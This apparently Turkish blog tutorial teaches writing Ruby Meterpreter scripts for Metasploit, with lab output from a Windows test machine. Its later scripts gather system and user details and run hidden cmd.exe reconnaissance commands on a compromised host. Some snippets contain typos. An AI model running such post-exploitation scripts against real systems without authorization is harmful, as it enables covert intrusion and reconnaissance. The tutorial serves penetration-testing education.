---

authors:
  - name: İbrahim Korucuoğlu
    link: https://github.com/siberoloji
    image: https://github.com/siberoloji.png


categories:
- Metasploit Framework
classicmag_header_overlay:
- global-layout
classicmag_post_layout:
- layout-1
classicmag_post_sidebar_option:
- right-sidebar
date: "2017-06-14T13:49:00Z"
excerpt: Meterpreter Scriptin nasıl bir yapı olduğunu önceki iki yazımızda kısaca
  gördük. Şimdi, kodların ne sonuç döndürdüğünü parça parça görelim. Bunun için “Hello
  World” ruby kodu yazalım ve helloworld.rb olarak /usr/share/metasploit-framework/scripts/meterpreter klasörüne
  kayıt edelim.
guid: https://www.siberoloji.com/?p=1207
id: 1207
image: /assets/images/2024/06/metasploit.jpg
tags:
- cybersecurity
- metasploit framework
title: MSF Meterpreter Script Düzenleme
url: /tr/msf-meterpreter-script-duzenleme/
---

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="script-yazma">Script Yazma 
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Meterpreter Scriptin nasıl bir yapı olduğunu önceki iki yazımızda kısaca gördük. Şimdi, kodların ne sonuç döndürdüğünü parça parça görelim. Bunun için “Hello World” ruby kodu yazalım ve&nbsp;<code>helloworld.rb</code>&nbsp;olarak&nbsp;<code>/usr/share/metasploit-framework/scripts/meterpreter</code>&nbsp;klasörüne kayıt edelim.</p>
  

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">root@kali:~# echo “print_status<strong>(</strong>“Hello World”<strong>)</strong>” <strong>&gt;</strong> /usr/share/metasploit-framework/scripts/meterpreter/helloworld.rb
</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>Oluşturduğumuz script kodunu meterpreter oturum açık iken çalıştıralım.</p>
  

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> run helloworld
<strong>[</strong><strong>*</strong><strong>]</strong> Hello World
meterpreter <strong>&gt;</strong>
</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>Basit bir Ruby kodunu, meterpreter içinde çalıştırmış olduk. Şimdi ise bir kaç API çağrısını&nbsp;<code>helloworld.rb</code>&nbsp;dosyamızın içine ekleyelim. Aşağıdaki satırları, metin editör kullanarak ekleyebilirsiniz.</p>
  

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">print_error<strong>(</strong>“this is an error!”<strong>)</strong>
print_line<strong>(</strong>“this is a line”<strong>)</strong>
</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>Yukarıdaki satırlar, standart veri girişi ve hata mesajları için kullanıma bir örnek oluşturmaktadır. Oluşturduğumuz kodları çalıştıralım.</p>
  

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> run helloworld
<strong>[</strong><strong>*</strong><strong>]</strong> Hello World
<strong>[</strong>-] this is an error!
this is a line
meterpreter <strong>&gt;</strong>
</code></pre>
<!-- /wp:code -->

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="helloworldrb">helloworld.rb 
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Script kod dosyamız en son olarak aşağıdaki gibi olmalıdır.</p>
  

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">print_status("Hello World")
print_error("this is an error!")
print_line("This is a line")
</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>Şimdi kodumuza bir fonksiyon ekleyelim. Bu fonksiyonda, bir kaç temel bilgi elde edeceğiz ve hata kontrol özelliği ekleyeceğiz. Oluşturacağımız mimarinin yapısı aşağıdaki gibi olacaktır.</p>
  

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash"> def geninfo<strong>(</strong>session<strong>)</strong>
    begin
    …..
    rescue ::Exception <strong>=&gt;</strong> e
    …..
    end
 end
</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>Bu yapıyı oluşturmak için dosyayı aşağıdaki şekilde düzenlemeniz yeterlidir. Bu düzenlemeleri yaptıktan sonra&nbsp;<code>helloworld.rb</code>&nbsp;dosyamızın içeriği aşağıdaki gibi olacaktır.</p>
  

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash"> def getinfo<strong>(</strong>session<strong>)</strong>
    begin
       sysnfo <strong>=</strong> session.sys.config.sysinfo
       runpriv <strong>=</strong> session.sys.config.getuid
       print_status<strong>(</strong>"Getting system information ..."<strong>)</strong>
       print_status<strong>(</strong>"tThe target machine OS is #{sysnfo['OS']}"<strong>)</strong>
       print_status<strong>(</strong>"tThe computer name is #{'Computer'} "<strong>)</strong>
       print_status<strong>(</strong>"tScript running as #{runpriv}"<strong>)</strong>
    rescue ::Exception <strong>=&gt;</strong> e
       print_error<strong>(</strong>"The following error was encountered #{e}"<strong>)</strong>
    end
 end
</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>Bu kodların ne işlem yaptığını adım adım açıklayalım. Öncelikle, değerleri&nbsp;<code>session</code>&nbsp;değişkeninden alan&nbsp;<code>getinfo(session)</code>&nbsp;isimli bir foksiyon tanımladık. Bu session değişkeni, bir takım metodları ihtiva etmektedir.&nbsp;<code>sysnfo = session.sys.config.sysinfo</code>&nbsp;satırı sistem bilgisini getirirken&nbsp;<code>runpriv = session.sys.config.getuid</code>&nbsp;kullanıcı bilgisini elde etmekte kullanılmaktadır. Ayrıca, hata durumlarını yönetici istisna yöneticisi bulunmaktadır.</p>
  

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="helloworld2rb">helloworld2.rb 
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>İlk oluşturduğumuz dosyaya ufak bir ilave yaparak&nbsp;<code>helloworld2.rb</code>&nbsp;dosyası üretelim.&nbsp;<code>helloworld2.rb</code>&nbsp;dosyası, az önce oluşturduğumuz dosyanın sonuna getinfo(client) satırının eklenmiş halidir. Bu satırı ekleyip dosyayı&nbsp;<code>helloworld2.rb</code>&nbsp;olarak kayıt edelim. Dosyanın son hali aşağıdaki gibi olmalıdır.</p>
  

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash"> def getinfo<strong>(</strong>session<strong>)</strong>
    begin
       sysnfo <strong>=</strong> session.sys.config.sysinfo
       runpriv <strong>=</strong> session.sys.config.getuid
       print_status<strong>(</strong>"Getting system information ..."<strong>)</strong>
       print_status<strong>(</strong>"tThe target machine OS is #{sysnfo['OS']}"<strong>)</strong>
       print _status<strong>(</strong>"tThe computer name is #{'Computer'} "<strong>)</strong>
       print_status<strong>(</strong>"tScript running as #{runpriv}"<strong>)</strong>
 rescue ::Exception <strong>=&gt;</strong> e
       print_error<strong>(</strong>"The following error was encountered #{e}"<strong>)</strong>
    end
 end

 getinfo<strong>(</strong>client<strong>)</strong>
</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>Şimdi hazırladığımız&nbsp;<code>helloworld2.rb</code>&nbsp;dosyamızı Meterpreter oturumunda çalıştıralım.</p>
  

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash"> meterpreter <strong>&gt;</strong> run helloworld2
 <strong>[</strong><strong>*</strong><strong>]</strong> Getting system information ...
 <strong>[</strong><strong>*</strong><strong>]</strong>     The target machine OS is Windows XP <strong>(</strong>Build 2600, Service Pack 3<strong>)</strong>.
 <strong>[</strong><strong>*</strong><strong>]</strong>     The computer name is Computer
 <strong>[</strong><strong>*</strong><strong>]</strong>     Script running as WINXPVM01labuser
</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>Gördüğünüz gibi&nbsp;<code>helloworld2.rb</code>&nbsp;scripti ile bir takım sistem bigilerini ele etmiş olduk.</p>
  

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="helloworld3rb">helloworld3.rb 
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Yukarıda oluşturduğumuz iki örnek kod dosyasından sonra şimdi başka bir örnek scripte bakalım. Bu script dosyasını metin editorü ile oluşturabilirsiniz. İçeriği aşağıdaki gibi olmalıdır.</p>
  

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">def list_exec<strong>(</strong>session,cmdlst<strong>)</strong>
    print_status<strong>(</strong>"Running Command List ..."<strong>)</strong>
    r<strong>=</strong>''
    session.response_timeout<strong>=</strong>120
    cmdlst.each <strong>do</strong> |cmd|
       begin
          print_status "running command #{cmd}"
          r <strong>=</strong> session.sys.process.execute<strong>(</strong>"cmd.exe /c #{cmd}", nil, <strong>{</strong>'Hidden' <strong>=&gt;</strong> true, 'Channelized' <strong>=&gt;</strong> true<strong>})</strong>
          <strong>while</strong><strong>(</strong>d <strong>=</strong> r.channel.read<strong>)</strong>
 
             print_status<strong>(</strong>"t#{d}"<strong>)</strong>
          end
          r.channel.close
          r.close
       rescue ::Exception <strong>=&gt;</strong> e
          print_error<strong>(</strong>"Error Running Command #{cmd}: #{e.class} #{e}"<strong>)</strong>
       end
    end
 end
 
 commands <strong>=</strong> <strong>[</strong> "set",
    "ipconfig  /all",
    "arp -a"<strong>]</strong>
 
 list_exec<strong>(</strong>client,commands<strong>)</strong>
</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>Yukarıdaki kodların ne işlemler yaptığına kısaca bakalım. Öncelikle,&nbsp;<code>list_exec</code>&nbsp;isimli bir fonksiyon tanımlanmıştır. Bu fonksiyon,&nbsp;<code>session</code>&nbsp;ve&nbsp;<code>cmdlist</code>&nbsp;isimli iki değişken almaktadır.&nbsp;<code>cmdlist</code>&nbsp;değişkeninin array yöntemiyle bir dizi komutlar olduğu, kodlardan anlaşılmaktadır. Bu komutlar, sırayla değişkenden alınacak&nbsp;<code>cmd.exe</code>&nbsp;üzerinden hedef sistemde çalıştırılacaktır. Sistemin donma ve tepkisiz kalma durumunu önlemek için&nbsp;<code>session.response_timeout=120</code>&nbsp;120 saniye bekleme süresi tanımlanmıştır. Önceki script kodunda olduğu gibi hata kontrol satırı da bulunmaktadır.</p>
  

<!-- wp:paragraph -->
<p><code>cmdlist</code>&nbsp;dizi değişkeni aslında aşağıda gösterilen komutları sırayla çalıştırmaktadır.</p>
  

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash"> commands <strong>=</strong> <strong>[</strong> “set”,
    “ipconfig  /all”,
    “arp –a”]
</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>Komutların sonunda da oluşturduğumuz fonksiyonu çalıştırma satırı&nbsp;<code>list_exec(client,commands)</code>&nbsp;bulunmaktadır.</p>
  

<!-- wp:paragraph -->
<p>Şimdi oluşturduğumuz yeni helloworld3.rb script kodunu Meterpreter oturumu içinde çalıştıralım.</p>
  

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash"> meterpreter <strong>&gt;</strong> run helloworld3
 <strong>[</strong><strong>*</strong><strong>]</strong> Running Command List ...
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command set
 <strong>[</strong><strong>*</strong><strong>]</strong>     ALLUSERSPROFILE<strong>=</strong>C:\Documents and Settings\All Users
 APPDATA<strong>=</strong>C:\Documents and Settings\P0WN3D\Application Data
 CommonProgramFiles<strong>=</strong>C:\Program Files\Common Files
 COMPUTERNAME<strong>=</strong>TARGET
 ComSpec<strong>=</strong>C:\WINNT\system32\cmd.exe
 HOMEDRIVE<strong>=</strong>C:
 HOMEPATH<strong>=</strong>
 LOGONSERVER<strong>=</strong>TARGET
 NUMBER_OF_PROCESSORS<strong>=</strong>1
 OS<strong>=</strong>Windows_NT
 Os2LibPath<strong>=</strong>C:\WINNT\system32\os2dll;
 Path<strong>=</strong>C:\WINNT\system32;C:\WINNT;C:\WINNT\System32\Wbem
 PATHEXT<strong>=</strong>.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH
 PROCESSOR_ARCHITECTURE<strong>=</strong>x86
 PROCESSOR_IDENTIFIER<strong>=</strong>x86 Family 6 Model 7 Stepping 6, GenuineIntel
 PROCESSOR_LEVEL<strong>=</strong>6
 PROCESSOR_REVISION<strong>=</strong>0706
 ProgramFiles<strong>=</strong>C:\Program Files
 PROMPT<strong>=</strong>$P$G
 SystemDrive<strong>=</strong>C:
 SystemRoot<strong>=</strong>C:\WINNT
 TEMP<strong>=</strong>C:\DOCUME~1\P0WN3D\LOCALS~1\Temp
 TMP<strong>=</strong>C:\DOCUME~1\P0WN3D\LOCALS~1\Temp
 USERDOMAIN<strong>=</strong>TARGET
 USERNAME<strong>=</strong>P0WN3D
 USERPROFILE<strong>=</strong>C:\Documents and Settings\P0WN3D
 windir<strong>=</strong>C:\WINNT
 
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command ipconfig  /all
 <strong>[</strong><strong>*</strong><strong>]</strong>     
 Windows 2000 IP Configuration
 
 Host Name . . . . . . . . . . . . : target
 Primary DNS Suffix  . . . . . . . : 
 Node Type . . . . . . . . . . . . : Hybrid
 IP Routing Enabled. . . . . . . . : No
 WINS Proxy Enabled. . . . . . . . : No
 DNS Suffix Search List. . . . . . : localdomain
 
 Ethernet adapter Local Area Connection:
 
 Connection-specific DNS Suffix  . : localdomain
 Description . . . . . . . . . . . : VMware Accelerated AMD PCNet Adapter
 Physical Address. . . . . . . . . : 00-0C-29-85-81-55
 DHCP Enabled. . . . . . . . . . . : Yes
 Autoconfiguration Enabled . . . . : Yes
 IP Address. . . . . . . . . . . . : 172.16.104.145
 Subnet Mask . . . . . . . . . . . : 255.255.255.0
 Default Gateway . . . . . . . . . : 172.16.104.2
 DHCP Server . . . . . . . . . . . : 172.16.104.254
 DNS Servers . . . . . . . . . . . : 172.16.104.2
 Primary WINS Server . . . . . . . : 172.16.104.2
 Lease Obtained. . . . . . . . . . : Tuesday, August 25, 2009 10:53:48 PM
 Lease Expires . . . . . . . . . . : Tuesday, August 25, 2009 11:23:48 PM
 
 <strong>[</strong><strong>*</strong><strong>]</strong>     running command arp -a
 <strong>[</strong><strong>*</strong><strong>]</strong>     
 Interface: 172.16.104.145 on Interface 0x1000003
 Internet Address      Physical Address      Type
 172.16.104.2          00-50-56-eb-db-06     dynamic   
 172.16.104.150        00-0c-29-a7-f1-c5     dynamic   
 
 meterpreter <strong>&gt;</strong>
</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>Gördüğünüz gibi, Ruby kodlarıyla script oluşturmak aslında çok kolay. İlk başta kodlar biraz karışık gelebilir ancak mevcut koldarı biraz çalıştığınızda aşinalık kazanacaksınız. Devamında yapmanız gereken, kod örneklerinden faydalanarak kendi script dosyanızı oluşturmak ve denemektir.</p>
  